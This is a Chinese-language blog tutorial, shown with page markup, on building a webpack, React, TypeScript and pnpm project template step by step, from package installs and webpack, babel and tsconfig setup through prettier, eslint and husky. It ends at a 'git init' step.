itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            现代webpack/react/typescript/pnpm项目模板，从零到一搭建webpack项目
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4398478256780440/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬阳春晖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:22:16.000Z" title="Tue Dec 16 2025 08:22:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目模板</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAvailableForTheWorld%2Fwebpack-react-template" target="_blank" title="https://github.com/AvailableForTheWorld/webpack-react-template" ref="nofollow noopener noreferrer">模板地址</a>
如果急用，直接使用当前模板即可。点击右上角Use This Template即可创建一个新的项目。</p>
<h2 data-id="heading-1">背景</h2>
<p>当我每每创建一个新的webpack项目时，总是需要经过繁琐的webpack配置来完成项目的init。如果从网络上搜寻快速的setup总会遇到各种各样的问题（由于包的版本有更新，有些配置已经废弃掉了）所有我决定搭建自己的webpack配置模板。</p>
<h2 data-id="heading-2">搭建步骤</h2>
<h3 data-id="heading-3">1. pnpm 开启webpack项目</h3>
<h4 data-id="heading-4">1.1 生成package.json</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm init
</code></pre>
<h4 data-id="heading-5">1.2 引入webpack</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D webpack webpack-cli webpack-dev-server
</code></pre>
<h4 data-id="heading-6">1.3 引入typescript</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D typescript ts-node @types/node
</code></pre>
<h4 data-id="heading-7">1.4 引入react</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add react react-dom
</code></pre>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D @types/react @types/react-dom
</code></pre>
<h3 data-id="heading-8">2. 初始化react代码</h3>
<h4 data-id="heading-9">2.1 创建src/app.tsx</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>
</code></pre>
<h4 data-id="heading-10">2.2 创建src/index.tsx</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./app'</span>

<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>)!).<span class="hljs-title function_">render</span>(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>)
</code></pre>
<h3 data-id="heading-11">3. webpack配置</h3>
<h4 data-id="heading-12">3.1 创建webpack.config.ts</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Configuration</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'webpack'</span>

<span class="hljs-keyword">const</span> rootDir = path.<span class="hljs-title function_">dirname</span>(<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))

<span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Configuration</span> = {
    <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.tsx'</span>,
    <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(rootDir, <span class="hljs-string">'dist'</span>),
        <span class="hljs-attr">filename</span>: <span class="hljs-string">'[name].[contenthash].js'</span>
    },
    <span class="hljs-attr">resolve</span>: {
        <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'.ts'</span>, <span class="hljs-string">'.tsx'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.jsx'</span>]
    },
    <span class="hljs-attr">devtool</span>: <span class="hljs-string">'source-map'</span>,
    <span class="hljs-attr">module</span>: {},
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'development'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> config
</code></pre>
<h4 data-id="heading-13">3.2 设置webpack插件</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D html-webpack-plugin clean-webpack-plugin
</code></pre>
<p>在public下创建index.html</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Webpack React Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"root"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>webpack 补充插件配置以及devServer配置</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'html-webpack-plugin'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CleanWebpackPlugin</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'clean-webpack-plugin'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Configuration</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'webpack'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'webpack-dev-server'</span>

<span class="hljs-keyword">const</span> rootDir = path.<span class="hljs-title function_">dirname</span>(<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))

<span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Configuration</span> = {
    <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.tsx'</span>,
    <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(rootDir, <span class="hljs-string">'dist'</span>),
        <span class="hljs-attr">filename</span>: <span class="hljs-string">'[name].[contenthash].js'</span>
    },
    <span class="hljs-attr">resolve</span>: {
        <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'.ts'</span>, <span class="hljs-string">'.tsx'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.jsx'</span>]
    },
    <span class="hljs-attr">plugins</span>: [
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({
            <span class="hljs-attr">template</span>: <span class="hljs-string">'./public/index.html'</span>
        }),
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>()
    ],
    <span class="hljs-attr">devtool</span>: <span class="hljs-string">'source-map'</span>,
    <span class="hljs-attr">devServer</span>: {
        <span class="hljs-attr">static</span>: {
            <span class="hljs-attr">directory</span>: path.<span class="hljs-title function_">join</span>(rootDir, <span class="hljs-string">'public'</span>)
        },
        <span class="hljs-attr">compress</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">historyApiFallback</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'development'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> config

</code></pre>
<h4 data-id="heading-14">3.3 设置webpack loader(style)</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D style-loader css-loader sass sass-loader
</code></pre>
<p>引入到webpack config的rules中：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Configuration</span> = {
    <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.tsx'</span>,
    <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(rootDir, <span class="hljs-string">'dist'</span>),
        <span class="hljs-attr">filename</span>: <span class="hljs-string">'[name].[contenthash].js'</span>
    },
    <span class="hljs-attr">resolve</span>: {
        <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'.ts'</span>, <span class="hljs-string">'.tsx'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.jsx'</span>]
    },
    <span class="hljs-attr">plugins</span>: [
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({
            <span class="hljs-attr">template</span>: <span class="hljs-string">'./public/index.html'</span>
        }),
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>()
    ],
    <span class="hljs-attr">devtool</span>: <span class="hljs-string">'source-map'</span>,
    <span class="hljs-attr">module</span>: {
        <span class="hljs-attr">rules</span>: [
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/i</span>,
                <span class="hljs-attr">use</span>: [<span class="hljs-string">'style-loader'</span>, <span class="hljs-string">'css-loader'</span>]
            },
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/i</span>,
                <span class="hljs-attr">use</span>: [<span class="hljs-string">'style-loader'</span>, <span class="hljs-string">'css-loader'</span>, <span class="hljs-string">'sass-loader'</span>]
            },
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|gif|svg)$/i</span>,
                <span class="hljs-attr">type</span>: <span class="hljs-string">'asset/resource'</span>
            }
        ]
    },
    <span class="hljs-attr">devServer</span>: {
        <span class="hljs-attr">static</span>: {
            <span class="hljs-attr">directory</span>: path.<span class="hljs-title function_">join</span>(rootDir, <span class="hljs-string">'public'</span>)
        },
        <span class="hljs-attr">compress</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">historyApiFallback</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'development'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> config

</code></pre>
<p>这里还引入静态资源的rules直接从asset/resource中获取。
因为我们引入了sass，这里我们还需要定义sass文件（.sass,.scss)的模块类型,在src/types里创建index.d.ts:</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'*.scss'</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">content</span>: { [<span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span> }
    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> content
}
</code></pre>
<h4 data-id="heading-15">3.4 设置webpack babel</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D @babel/core @babel/preset-env @babel/preset-react @babel/preset-typescript babel-loader
</code></pre>
<p>在config进行如下配置</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'html-webpack-plugin'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CleanWebpackPlugin</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'clean-webpack-plugin'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Configuration</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'webpack'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'webpack-dev-server'</span>

<span class="hljs-keyword">const</span> rootDir = path.<span class="hljs-title function_">dirname</span>(<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))

<span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Configuration</span> = {
    <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.tsx'</span>,
    <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(rootDir, <span class="hljs-string">'dist'</span>),
        <span class="hljs-attr">filename</span>: <span class="hljs-string">'[name].[contenthash].js'</span>
    },
    <span class="hljs-attr">resolve</span>: {
        <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'.ts'</span>, <span class="hljs-string">'.tsx'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.jsx'</span>]
    },
    <span class="hljs-attr">plugins</span>: [
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({
            <span class="hljs-attr">template</span>: <span class="hljs-string">'./public/index.html'</span>
        }),
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>()
    ],
    <span class="hljs-attr">devtool</span>: <span class="hljs-string">'source-map'</span>,
    <span class="hljs-attr">module</span>: {
        <span class="hljs-attr">rules</span>: [
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(ts|js)x?$/</span>,
                <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>,
                <span class="hljs-attr">use</span>: [
                    {
                        <span class="hljs-attr">loader</span>: <span class="hljs-string">'babel-loader'</span>,
                        <span class="hljs-attr">options</span>: {
                            <span class="hljs-attr">presets</span>: [
                                <span class="hljs-string">'@babel/preset-env'</span>,
                                [<span class="hljs-string">'@babel/preset-react'</span>, { <span class="hljs-attr">runtime</span>: <span class="hljs-string">'automatic'</span> }],
                                <span class="hljs-string">'@babel/preset-typescript'</span>
                            ]
                        }
                    }
                ]
            },
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/i</span>,
                <span class="hljs-attr">use</span>: [<span class="hljs-string">'style-loader'</span>, <span class="hljs-string">'css-loader'</span>]
            },
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/i</span>,
                <span class="hljs-attr">use</span>: [<span class="hljs-string">'style-loader'</span>, <span class="hljs-string">'css-loader'</span>, <span class="hljs-string">'sass-loader'</span>]
            },
            {
                <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|gif|svg)$/i</span>,
                <span class="hljs-attr">type</span>: <span class="hljs-string">'asset/resource'</span>
            }
        ]
    },
    <span class="hljs-attr">devServer</span>: {
        <span class="hljs-attr">static</span>: {
            <span class="hljs-attr">directory</span>: path.<span class="hljs-title function_">join</span>(rootDir, <span class="hljs-string">'public'</span>)
        },
        <span class="hljs-attr">compress</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">historyApiFallback</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'development'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> config

</code></pre>
<h3 data-id="heading-16">4. typescript配置</h3>
<p>根目录上创建tsconfg.json</p>
<pre><code class="hljs language-ts" lang="ts">{
    <span class="hljs-string">"compilerOptions"</span>: {
        <span class="hljs-string">"module"</span>: <span class="hljs-string">"esnext"</span>,
        <span class="hljs-string">"target"</span>: <span class="hljs-string">"esnext"</span>,
        <span class="hljs-string">"moduleResolution"</span>: <span class="hljs-string">"bundler"</span>,
        <span class="hljs-string">"lib"</span>: [<span class="hljs-string">"dom"</span>, <span class="hljs-string">"dom.iterable"</span>, <span class="hljs-string">"esnext"</span>],

        <span class="hljs-string">"sourceMap"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"declaration"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"declarationMap"</span>: <span class="hljs-literal">true</span>,

        <span class="hljs-string">"noUncheckedIndexedAccess"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"exactOptionalPropertyTypes"</span>: <span class="hljs-literal">true</span>,

        <span class="hljs-string">"strict"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"jsx"</span>: <span class="hljs-string">"react-jsx"</span>,
        <span class="hljs-string">"jsxImportSource"</span>: <span class="hljs-string">"react"</span>,
        <span class="hljs-string">"verbatimModuleSyntax"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"isolatedModules"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"noUncheckedSideEffectImports"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"moduleDetection"</span>: <span class="hljs-string">"force"</span>,
        <span class="hljs-string">"skipLibCheck"</span>: <span class="hljs-literal">true</span>
    }
}
</code></pre>
<p>通过上述配置，我们修改package.json的scripts</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 	<span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack serve --open --port 3210"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>此时运行pnpm run start即可在3210端口访问项目。</p>
<p>接下来的内容是锦上添花：优化工程，即代码风格格式化，typescript eslint规则校验，使用git hooks触发生命周期钩子</p>
<h3 data-id="heading-17">5. 使用prettier格式化代码</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D prettier
</code></pre>
<p>在根目录创建.prettierrc</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"semi"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"singleQuote"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"trailingComma"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"none"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"tabWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"useTabs"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"printWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">120</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"bracketSpacing"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"arrowParens"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"avoid"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"endOfLine"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"auto"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>在package.json配置格式化脚本</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack serve --open --port 3210"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write \"src/**/*.{js,jsx,ts,tsx,json,css,md}\""</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>执行即可把src中所有代码文件格式化</p>
<h3 data-id="heading-18">6. 配置eslint</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D eslint typescript-eslint eslint-plugin-react eslint-plugin-react-hooks eslint-webpack-plugin
</code></pre>
<p>根目录创建eslint.config.js</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> tseslint <span class="hljs-keyword">from</span> <span class="hljs-string">'typescript-eslint'</span>
<span class="hljs-keyword">import</span> reactPlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-react'</span>
<span class="hljs-keyword">import</span> reactHooks <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-react-hooks'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
    ...tseslint.<span class="hljs-property">configs</span>.<span class="hljs-property">recommended</span>,
    {
        <span class="hljs-attr">files</span>: [<span class="hljs-string">'**/*.{ts,tsx}'</span>],
        <span class="hljs-attr">plugins</span>: {
            <span class="hljs-attr">react</span>: reactPlugin,
            <span class="hljs-string">'react-hooks'</span>: reactHooks
        },
        <span class="hljs-attr">rules</span>: {
            ...reactPlugin.<span class="hljs-property">configs</span>.<span class="hljs-property">recommended</span>.<span class="hljs-property">rules</span>,
            ...reactHooks.<span class="hljs-property">configs</span>.<span class="hljs-property">recommended</span>.<span class="hljs-property">rules</span>
        },
        <span class="hljs-attr">settings</span>: {
            <span class="hljs-attr">react</span>: { <span class="hljs-attr">version</span>: <span class="hljs-string">'detect'</span> }
        }
    }
]

</code></pre>
<p>在packages的scripts脚本中写入</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack serve --open --port 3210"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webpack"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write \"src/**/*.{js,jsx,ts,tsx,json,css,md}\""</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint --ext .ts,.tsx"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"lint:fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint --ext .ts,.tsx --fix"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<h3 data-id="heading-19">7. husky 设置lint-staged</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D husky lint-staged
</code></pre>
<h4 data-id="heading-20">7.1 初始化git仓库</h4>
<pre><code class="hljs language-bash" lang="bash">git init
</code></pre>
